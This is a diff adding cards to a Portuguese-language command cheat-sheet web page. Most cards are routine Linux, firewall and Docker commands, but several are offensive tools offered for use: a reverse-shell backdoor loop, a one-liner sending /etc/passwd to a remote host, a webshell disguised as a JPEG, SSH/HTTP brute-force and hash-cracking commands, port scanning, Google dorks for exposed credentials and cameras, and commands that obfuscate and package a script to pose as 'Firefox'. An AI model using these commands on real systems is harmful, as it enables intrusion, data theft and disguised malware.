+            <p><strong>Renomear interface de rede - </strong>sudo ip link set eth0 name eth1</p>
+            <p><strong>Verificar endereço IP da interface - </strong>ip addr show eth0</p>
+            <p><strong>Configurar endereço IP estático - </strong>sudo ip addr add 192.168.1.100/24 dev eth0</p>
+            <p><strong>Remover endereço IP - </strong>sudo ip addr del 192.168.1.100/24 dev eth0</p>
+            <p><strong>Adicionar rota padrão - </strong>sudo ip route add default via 192.168.1.1</p>
+            <p><strong>Verificar tabela de roteamento - </strong>ip route show</p>
+            <p><strong>Testar conectividade (ping) - </strong>ping google.com</p>
+            <p><strong>Liberar e renovar IP (DHCP) - </strong>sudo dhclient -r eth0 && sudo dhclient eth0</p>
+            <p><strong>Verificar status da interface - </strong>ip link show eth0</p>
+            <p><strong>Habilitar/Desabilitar IPv6 - </strong>sudo sysctl -w net.ipv6.conf.eth0.disable_ipv6=1</p>
+            <p><strong>Verificar tráfego de rede - </strong>sudo iftop -i eth0</p>
+            <p><strong>Configurar DNS temporário - </strong>sudo echo "nameserver 8.8.8.8" > /etc/resolv.conf</p>
+            <p><strong>Verificar resolução DNS - </strong>nslookup google.com</p>
+            <p><strong>Verificar velocidade da interface - </strong>ethtool eth0</p>
+            <p><strong>Configurar MTU da interface - </strong>sudo ip link set eth0 mtu 1500</p>
+            <p><strong>Monitorar tráfego de rede em tempo real - </strong>sudo tcpdump -i eth0</p>
+            <p><strong>Observar conexões ativas - </strong>ss -tulnp</p>
+            <br>
+            <p><strong>Descoberta de Rede (ARP) - </strong>sudo netdiscover</p>
+            <p><strong>PingSweep</strong> - (for ip in 192.168.1.{1..254}; do (ping -c 1 -W 1 $ip > /dev/null 2>&1
+                && echo "$ip está ativo") & done; wait) 2>/dev/null</p>
+            <p><strong>PortScanner</strong> - (for port in {1..65535}; do (echo > /dev/tcp/<IP_ALVO>/$port)
+                    2>/dev/null && echo "Porta $port aberta" & done; wait) 2>/dev/null</p>
+            <p><strong>Verificar Tabela Arp - - </strong>cat /proc/net/arp</p>
+
+
+        </div>
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Recriar GRUB</h1>
+            <p><strong>GRUB:</strong></p>
+            <p>grub> set root=(hd0,1) &lt;&lt;- sintaxe da versão Grub2</p>
+            <p>grub> linux /boot/vmlinuz-xxxx root=/dev/sda1 ro quiet</p>
+            <p>grub> initrd /boot/initrd.img</p>
+            <p>grub> boot</p>
+            <p><strong>CFG:</strong></p>
+            <p>sudo nano /etc/default/grub</p>
+            <p><strong>Manual em:</strong> <a href="https://www.gnu.org/software/grub"
+                    target="_blank">www.gnu.org/software/grub</a></p>
+        </div>
+
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Manipulação de Serviços</h1>
+            <p><strong>Listar Serviços - </strong>sudo systemctl list-unit-files</p>
+            <p><strong>Habilitar Serviço - </strong>sudo systemctl enable (nome do serviço)</p>
+            <p><strong>Desabilitar Serviço - </strong>sudo systemctl disable (nome do serviço)</p>
+            <p><strong>Status do Serviço - </strong>sudo systemctl status (nome do serviço)</p>
+            <p><strong>Iniciar Serviço - </strong>sudo systemctl start (nome do serviço)</p>
+            <p><strong>Parar Serviço - </strong>sudo systemctl stop (nome do serviço)</p>
+            <p><strong>Reiniciar Serviço - </strong>sudo systemctl restart (nome do serviço)</p>
+            <p><strong>Recarregar Serviços - </strong>sudo systemctl daemon-reload</p>
+            <p><strong>Diretórios comuns dos Serviços - </strong>/lib, /etc e /run : /systemd/system/</p>
+        </div>
+
+
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Firewall Commands</h1>
+            <p><strong>Redirecionar saída para destino específico:</strong></p>
+            <p>sudo iptables -t nat -A OUTPUT -o tun0 -j DNAT --to-destination 10.13.5.224</p>
+            <p><strong>Alterar a interface de uma zona:</strong></p>
+            <p>firewall-cmd --zone={selected_zone} --change-interface={seleciona_interface} --permanent</p>
+            <p><strong>Adicionar interfaces a uma zona:</strong></p>
+            <p>firewall-cmd --zone={selected_zone} --permanent --add-interface={seleciona_interface}</p>
+            <p><strong>Remover interfaces de uma zona:</strong></p>
+            <p>firewall-cmd --zone={selected_zone} --permanent --remove-interface={interface_to_remove}</p>
+            <p><strong>Adicionar serviços a uma zona:</strong></p>
+            <p>firewall-cmd --add-service={service_choice} --permanent --zone={selected_zone}</p>
+            <p><strong>Remover serviços de uma zona:</strong></p>
+            <p>firewall-cmd --remove-service={service_choice} --permanent --zone={selected_zone}</p>
+            <p><strong>Adicionar portas a uma zona:</strong></p>
+            <p>firewall-cmd --add-port={port}/tcp --permanent --zone={selected_zone}</p>
+            <p>firewall-cmd --add-port={port}/udp --permanent --zone={selected_zone}</p>
+            <p><strong>Remover portas de uma zona:</strong></p>
+            <p>firewall-cmd --remove-port={port}/tcp --permanent --zone={selected_zone}</p>
+            <p>firewall-cmd --remove-port={port}/udp --permanent --zone={selected_zone}</p>
+            <p><strong>Bloquear IP:</strong></p>
+            <p>firewall-cmd --permanent --zone={selected_zone} --add-rich-rule='rule family=ipv4 source
+                address={blocked_ip} drop'</p>
+            <p><strong>Bloquear range de IP por máscara (não testado):</strong></p>
+            <p>firewall-cmd --permanent --zone={selected_zone} --add-rich-rule='rule family=ipv4 source
+                address={ip_mask} drop'</p>
+            <p><strong>Alterar o target:</strong></p>
+            <p>firewall-cmd --zone=selected_zone --set-target=sit-target</p>
+            <p><strong>Aplicar configurações:</strong></p>
+            <p>firewall-cmd --reload</p>
+            <br>
+            <h1>Redirecionar Portas com Firewalld</h1>
+            <p><strong>Adicionar redirecionamento de porta:</strong></p>
+            <p>firewall-cmd --add-forward-port=port=80:proto=tcp:toport=3000</p>
+            <p>firewall-cmd --runtime-to-permanent</p>
+            <p><strong>Remover redirecionamento de porta:</strong></p>
+            <p>firewall-cmd --remove-forward-port=port=80:proto=tcp:toport=3000:toaddr=</p>
+            <p>firewall-cmd --runtime-to-permanent</p>
+        </div>
+
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Baixar Sites</h1>
+            <p><strong>Com WGET (SinglePage) - </strong>wget --mirror --convert-links --adjust-extension
+                --page-requisites https://URL</p>
+            <p><strong>Com WGET (FullPage) - </strong>wget -e robots=off -mpEk --span-hosts --no-parent --domains
+                bootstrapmade.com https://URL</p>
+            <p><strong>Com CURL - </strong>curl -O https://URL</p>
+            <p><strong>Com /dev/tcp - </strong>exec 3<> /dev/tcp/IP_REMOTO/PORTA ;echo -e "GET / HTTP/1.1\r\nHost:
+                    IP_REMOTO\r\nConnection: close\r\n\r\n" >&3; cat <&3> NOME_ARQUIVO</p>
+        </div>
+
+        <div class="note-card2">
+            <h1>Fuzzing</h1>
+            <p><strong>Fuzzing diretórios:</strong></p>
+            <p><code>ffuf -u http://target.com/FUZZ -w wordlist.txt</code></p>
+            <p><strong>Fuzzing subdomínios:</strong></p>
+            <p><code>ffuf -u https://FUZZ.victim.com -w wordlist.txt</code></p>
+        </div>
+
+        <div class="note-card2">
+            <h1>Brute Force</h1>
+            <p><strong>Hydra - Ataque de força bruta em SSH:</strong></p>
+            <p><code>hydra -l usuario -P /caminho/para/wordlist.txt ssh://IP_ALVO</code></p>
+            <p><strong>Hydra - Ataque de força bruta em HTTP:</strong></p>
+            <p><code>hydra -l usuario -P /caminho/para/wordlist.txt IP_ALVO http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"</code>
+            </p>
+            <p><strong>Medusa - Ataque de força bruta em FTP:</strong></p>
+            <p><code>medusa -h IP_ALVO -u usuario -P /caminho/para/wordlist.txt -M ftp</code></p>
+            <p><strong>John The Ripper - Força bruta em hashes:</strong></p>
+            <p><code>john --wordlist=/caminho/para/wordlist.txt hash.txt</code></p>
+            <p><strong>Hashcat - Força bruta em hashes:</strong></p>
+            <p><code>hashcat -m 0 -a 0 hash.txt /caminho/para/wordlist.txt</code></p>
+            <p><strong>WFuzz - Força bruta em parâmetros de URL:</strong></p>
+            <p><code>wfuzz -c -z file,/caminho/para/wordlist.txt --hc 404 http://IP_ALVO/FUZZ</code></p>
+
+        </div>
+
+
+        <div class="note-card2">
+            <h1>Ordenação de Arquivos</h1>
+            <p><strong>Ordenar arquivo em ordem crescente:</strong></p>
+            <p>cat arquivo.txt | sort</p>
+            <p><strong>Ordenar arquivo em ordem decrescente:</strong></p>
+            <p>cat arquivo.txt | sort -r</p>
+            <p><strong>Exibir arquivo em ordem crescente com números:</strong></p>
+            <p>sort -n arquivo.txt</p>
+            <p><strong>Exibir arquivo em ordem decrescente com números:</strong></p>
+            <p>sort -nr arquivo.txt</p>
+            <br>
+            <p><strong>Exibir conteúdo do arquivo:</strong></p>
+            <p>cat arquivo.txt</p>
+            <p><strong>Exibir conteúdo do arquivo em ordem inversa:</strong></p>
+            <p>tac arquivo.txt</p>
+
+        </div>
+
+        <div class="note-card2">
+            <h1>Persistência (Shell)</h1>
+            <p><strong>Shell Backdoor com While True:</strong></p>
+            <p><code>while true; do exec 3<>/dev/tcp/127.0.0.1/4545; /bin/sh 0<&3 1>&3 2>&3; sleep 5; done</p></code>
+        </div>
+
+        <div class="note-card2">
+            <h1>Exfiltrar Arquivos (Shell)</h1>
+            <p><strong>Shell Backdoor com While True:</strong></p>
+            <p><code>exec 3<>/dev/tcp/192.168.0.10/4545; cat /etc/passwd >&3; exec 3<&-; exec 3>&-</p></code>
+        </div>
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Dados de Conexão</h1>
+            <p><strong>IP Externo - </strong>curl ifconfig.me</p>
+        </div>
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>PHP</h1>
+            <p><strong>Camuflar WebShellPHP em Imagem:</strong></p>
+            <p>echo -e "\xFF\xD8\xFF\xE0" > image.php</p>
+            <p>echo -n '&lt;?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?&gt;' >>
+                image.php
+            </p>
+            <p><strong>Verificar o arquivo</strong></p>
+            <p>file image.php</p>
+            <p><strong>Deve retornar o seguinte:</strong></p>
+            <p>image.php: JPEG image data</p>
+        </div>
+
+
+
+        <div class="note-card2">
+            <h1>Google Dorks</h1>
+            <p><strong>Finding exposed directories:</strong></p>
+            <p><code>intitle:"Index of" -inurl:(jsp|pl|php|html|aspx|htm|cf|shtml) </code></p>
+            <p><code>-inurl:(listen77|mp3raid|mp3toss|mp3drug|index_of|wallywashis)</code></p>
+            <p><strong>Discovering open webcams:</strong></p>
+            <p><code>inurl:"viewerframe?mode=motion"</code></p>
+
+            <p><strong>Finding email lists:</strong></p>
+            <p><code>filetype:txt @gmail.com OR @yahoo.com OR @hotmail.com OR @aol.com</code></p>
+
+            <p><strong>Uncovering vulnerable web servers:</strong></p>
+            <p><code>intitle:"Welcome to Windows 2000 Internet Services"</code></p>
+
+            <p><strong>Discovering exposed CCTV cameras:</strong></p>
+            <p><code>inurl:ViewerFrame?Mode=Motion</code></p>
+
+            <p><strong>Finding SQL injection vulnerabilities:</strong></p>
+            <p><code>inurl:index.php?id=</code></p>
+
+            <p><strong>Uncovering sensitive information in files:</strong></p>
+            <p><code>intitle:"Index of" password.txt</code></p>
+
+            <p><strong>Discovering login pages:</strong></p>
+            <p><code>inurl:admin/login</code></p>
+
+            <p><strong>Finding exposed databases:</strong></p>
+            <p><code>intext:"phpMyAdmin" "running on" inurl:"main.php"</code></p>
+
+            <p><strong>Discovering vulnerable WordPress sites:</strong></p>
+            <p><code>inurl:/wp-content/plugins/revslider/</code></p>
+
+            <p><strong>Finding open FTP servers:</strong></p>
+            <p><code>intitle:"index of" inurl:ftp</code></p>
+
+            <p><strong>Discovering exposed configuration files:</strong></p>
+            <p><code>intitle:"index of" config.yml</code></p>
+
+            <p><strong>Finding open Git repositories:</strong></p>
+            <p><code>intitle:index of .git</code></p>
+
+            <p><strong>Discovering vulnerable Joomla installations:</strong></p>
+            <p><code>inurl:/index.php?option=com_joomla</code></p>
+
+            <p><strong>Finding sensitive files:</strong></p>
+            <p><code>intitle:"index of" password OR passcode OR passphrase OR keyfile</code></p>
+
+            <p><strong>Discovering exposed MongoDB instances:</strong></p>
+            <p><code>intitle:"mongodb status" intext:"topologyVersion"</code></p>
+
+            <p><strong>Finding open network devices:</strong></p>
+            <p><code>intitle:"open network devices"</code></p>
+
+            <p><strong>Discovering exposed subdomains:</strong></p>
+            <p><code>site:\*.example.com -www</code></p>
+
+            <p><strong>Finding vulnerable Apache Tomcat installations:</strong></p>
+            <p><code>intitle:"Apache Tomcat" intext:"If you're seeing this, you've successfully installed Tomcat"</code>
+            </p>
+
+            <p><strong>Discovering exposed GitLab repositories:</strong></p>
+            <p><code>intitle:"GitLab"</code></p>
+
+            <p><strong>Finding exposed server directories:</strong></p>
+            <p><code>intitle:"index of" /admin</code></p>
+
+            <p><strong>Discovering sensitive Google Drive files:</strong></p>
+            <p><code>site:drive.google.com confidential</code></p>
+
+            <p><strong>Finding exposed Jenkins instances:</strong></p>
+            <p><code>intitle:"Dashboard [Jenkins]"</code></p>
+
+            <p><strong>Discovering exposed AWS S3 buckets:</strong></p>
+            <p><code>site:s3.amazonaws.com</code></p>
+
+            <p><strong>Finding vulnerable Magento installations:</strong></p>
+            <p><code>inurl:/index.php/admin</code></p>
+
+            <p><strong>Discovering exposed log files:</strong></p>
+            <p><code>intitle:"index of" error.log</code></p>
+
+            <p><strong>Finding open Elasticsearch instances:</strong></p>
+            <p><code>intitle:"Kibana" intext:"Welcome to Elastic"</code></p>
+
+            <p><strong>Discovering exposed API keys:</strong></p>
+            <p><code>filetype:env intext:API_KEY</code></p>
+
+            <p><strong>Finding exposed phpMyAdmin installations:</strong></p>
+            <p><code>inurl:"phpmyadmin/index.php"</code></p>
+
+            <p><strong>Discovering vulnerable OpenCart installations:</strong></p>
+            <p><code>inurl:/admin/config.php</code></p>
+
+            <p><strong>Finding exposed sensitive documents:</strong></p>
+            <p><code>filetype:pdf "Confidential"</code></p>
+
+            <p><strong>Discovering exposed network devices:</strong></p>
+            <p><code>intitle:"Device name" inurl:home.htm</code></p>
+
+            <p><strong>Finding open RDP (Remote Desktop Protocol) servers:</strong></p>
+            <p><code>intitle:"Remote Desktop Web Connection"</code></p>
+
+            <p><strong>Discovering exposed Firebase databases:</strong></p>
+            <p><code>intitle:"Firebase Console - Projects"</code></p>
+
+            <p><strong>Finding vulnerable Drupal installations:</strong></p>
+            <p><code>inurl:"/user/login" "Powered by Drupal"</code></p>
+        </div>
+
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Enumeração</h1>
+            <p><strong>LinPeas - </strong>curl -L
+                https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash</p>
+        </div>
+
+        <div class="note-card2">
+            <h1>Docker Commands</h1>
+            <p><strong>Listar containers em execução:</strong> docker ps</p>
+            <p><strong>Listar todos containers (inclusive parados):</strong> docker ps -a</p>
+            <p><strong>Iniciar container parado:</strong> docker start &lt;container_id/nome&gt;</p>
+            <p><strong>Parar container rodando:</strong> docker stop &lt;container_id/nome&gt;</p>
+            <p><strong>Reiniciar container:</strong> docker restart &lt;container_id/nome&gt;</p>
+            <p><strong>Remover container:</strong> docker rm &lt;container_id/nome&gt;</p>
+            <p><strong>Remover todos containers parados:</strong> docker container prune</p>
+            <p><strong>Monitorar uso de recursos dos containers em tempo real:</strong> docker stats</p>
+            <br>
+            <p><strong>Listar imagens locais:</strong> docker images ou docker image ls</p>
+            <p><strong>Baixar imagem do Docker Hub:</strong> docker pull &lt;imagem&gt;:&lt;tag&gt;</p>
+            <p><strong>Enviar imagem para o Docker Hub:</strong> docker push &lt;imagem&gt;:&lt;tag&gt;</p>
+            <p><strong>Remover imagem específica:</strong> docker rmi &lt;imagem&gt;:&lt;tag&gt;</p>
+            <p><strong>Remover todas imagens sem container associado:</strong> docker image prune</p>
+            <p><strong>Remover todas imagens do host:</strong> docker rmi $(docker images -q)</p>
+            <br>
+            <p><strong>Listar redes:</strong> docker network ls</p>
+            <p><strong>Criar nova rede:</strong> docker network create &lt;nome_rede&gt;</p>
+            <p><strong>Inspecionar rede:</strong> docker network inspect &lt;nome_rede&gt;</p>
+            <p><strong>Remover rede:</strong> docker network rm &lt;nome_rede&gt;</p>
+            <br>
+            <p><strong>Ver logs do container:</strong> docker logs &lt;container_id/nome&gt;</p>
+            <p><strong>Executar comando dentro do container:</strong> docker exec -it &lt;container_id/nome&gt;
+                /bin/bash</p>
+            <p><strong>Build de imagem via Dockerfile:</strong> docker build -t &lt;nome_imagem&gt;:&lt;tag&gt; .
+            </p>
+            <p><strong>Parar todos os containers:</strong> docker stop $(docker ps -q)</p>
+            <p><strong>Remover todos os containers:</strong> docker rm $(docker ps -aq)</p>
+            <p><strong>Limpar tudo (containers, imagens, volumes e redes não usadas):</strong> docker system prune
+                -a
+            </p>
+        </div>
+
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Estabilizar Conexão</h1>
+            <p><strong>Reverse Shell - </strong> <a href="https://www.revshells.com/"
+                    target="_blank">https://www.revshells.com/</a></p>
+        </div>
+
+
+        <div class="note-card2">
+            <h1>SED</h1>
+            <p><strong>Substituir primeira ocorrência:</strong></p>
+            <p><code>sed 's/old_word/new_word/' arquivo.txt</code></p>
+            <p>Substitui apenas a primeira ocorrência de <code>old_word</code> por <code>new_word</code> em cada linha.
+            </p>
+            <br>
+            <p><strong>Substituir todas ocorrências (global):</strong></p>
+            <p><code>sed 's/old_word/new_word/g' arquivo.txt</code></p>
+            <p>Substitui todas as ocorrências de <code>old_word</code> por <code>new_word</code> em cada linha.</p>
+            <br>
+            <p><strong>Substituir a n-ésima ocorrência:</strong></p>
+            <p><code>sed 's/old_word/new_word/3' arquivo.txt</code></p>
+            <p>Altera apenas a terceira ocorrência de <code>old_word</code> para <code>new_word</code> em cada
+                linha.</p>
+            <br>
+            <p><strong>Deletar linhas em branco:</strong></p>
+            <p><code>sed '/^$/d' arquivo.txt</code></p>
+            <p>Remove todas as linhas vazias do arquivo.</p>
+            <br>
+            <p><strong>Inserir texto antes da linha correspondente:</strong></p>
+            <p><code>sed '/pattern/i\Texto a inserir' arquivo.txt</code></p>
+            <p>Insere “Texto a inserir” antes de cada linha que contenha <code>pattern</code>.</p>
+            <br>
+            <p><strong>Apender texto após a linha correspondente:</strong></p>
+            <p><code>sed '/pattern/a\Texto a apendar' arquivo.txt</code></p>
+            <p>Apende “Texto a apendar” após cada linha que contenha <code>pattern</code>.</p>
+            <br>
+            <p><strong>Numeração simples de linhas:</strong></p>
+            <p><code>sed = arquivo.txt | sed 'N;s/\n/\t/'</code></p>
+            <p>Numera cada linha, alinhando o número à esquerda com uma tabulação.</p>
+            <br>
+            <p><strong>Mostrar apenas linhas de 5 a 10:</strong></p>
+            <p><code>sed -n '5,10p' arquivo.txt</code></p>
+            <p>Imprime apenas as linhas de 5 a 10 do arquivo.</p>
+            <br>
+            <p><strong>Edição in-place com backup:</strong></p>
+            <p><code>sed -i.bak 's/old/new/g' arquivo.txt</code></p>
+            <p>Substitui globalmente <code>old</code> por <code>new</code> diretamente em <code>arquivo.txt</code>,
+                salvando o original em <code>arquivo.txt.bak</code>.</p>
+            <br>
+            <p><strong>Usar expressões regulares estendidas:</strong></p>
+            <p><code>sed -E 's/[[:space:]]+/ /g' arquivo.txt</code></p>
+            <p>Substitui múltiplos espaços em branco por um único espaço, usando regex estendida.</p>
+        </div>
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Ofuscação</h1>
+            <p><strong>PyArmor - </strong>pyarmor -q gen gunkey.py</p>
+            <p><strong>PyInstaller - </strong>pyinstaller -n Firefox -F gunkey.py</p>
+            <p><strong>PyArmor with Obfuscation - </strong>pyarmor gen -O obfdist --pack dist/Firefox
+                gunkey.py</p>
+        </div>
 
         <div class="note-card2">
             <h1>Busca de Arquivos</h1>
